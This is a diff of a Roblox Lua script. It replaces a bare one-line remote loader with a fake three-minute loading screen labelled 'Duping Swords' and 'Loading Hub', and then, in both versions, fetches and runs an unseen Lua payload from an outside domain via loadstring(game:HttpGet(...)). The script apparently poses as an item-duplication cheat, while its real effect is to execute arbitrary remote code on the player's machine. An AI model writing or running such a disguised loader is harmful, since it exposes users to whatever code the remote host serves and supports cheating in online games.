@@ -1,1 +1,76 @@
-loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+local loadingFrame = Instance.new("Frame")
+local titleLabel = Instance.new("TextLabel")
+local subtitleLabel = Instance.new("TextLabel")
+local percentLabel = Instance.new("TextLabel")
+
+-- Set up the ScreenGui
+screenGui.Name = "LoadingScreenGui"
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Function to create and display the loading screen
+local function createLoadingScreen()
+    -- Set up the loading frame
+    loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    loadingFrame.Position = UDim2.new(0, 0, 0, 0)
+    loadingFrame.Parent = screenGui
+
+    -- Set up the title label
+    titleLabel.Size = UDim2.new(0, 400, 0, 50)
+    titleLabel.Position = UDim2.new(0.5, -200, 0.5, -50)
+    titleLabel.Text = "Duping Swords"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextScaled = true
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Parent = loadingFrame
+
+    -- Set up the subtitle label
+    subtitleLabel.Size = UDim2.new(0, 300, 0, 50)
+    subtitleLabel.Position = UDim2.new(0.5, -150, 0.5, 10)
+    subtitleLabel.Text = "Loading Hub"
+    subtitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    subtitleLabel.TextScaled = true
+    subtitleLabel.Font = Enum.Font.SourceSans
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Parent = loadingFrame
+
+    -- Set up the percent label
+    percentLabel.Size = UDim2.new(0, 200, 0, 50)
+    percentLabel.Position = UDim2.new(0.5, -100, 0.5, 70)
+    percentLabel.Text = "0%"
+    percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentLabel.TextScaled = true
+    percentLabel.Font = Enum.Font.GothamBold -- Use a low-poly style font
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Parent = loadingFrame
+
+    -- Loading logic
+    local duration = 180 -- 3 minutes
+    local interval = 0.1 -- Update every 0.1 seconds
+    local totalSteps = duration / interval
+
+    for i = 1, totalSteps do
+        wait(interval)
+        
+        -- Update the percent label
+        local percentComplete = math.floor((i / totalSteps) * 100)
+        percentLabel.Text = percentComplete .. "%"
+    end
+
+    -- Hide the loading screen after loading
+    loadingFrame.Visible = false
+
+    -- Load the external script
+    loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
+end
+
+-- Show the loading screen when the character is added or respawned
+player.CharacterAdded:Connect(function()
+    createLoadingScreen()
+end)
+
+-- Create the loading screen initially
+createLoadingScreen()
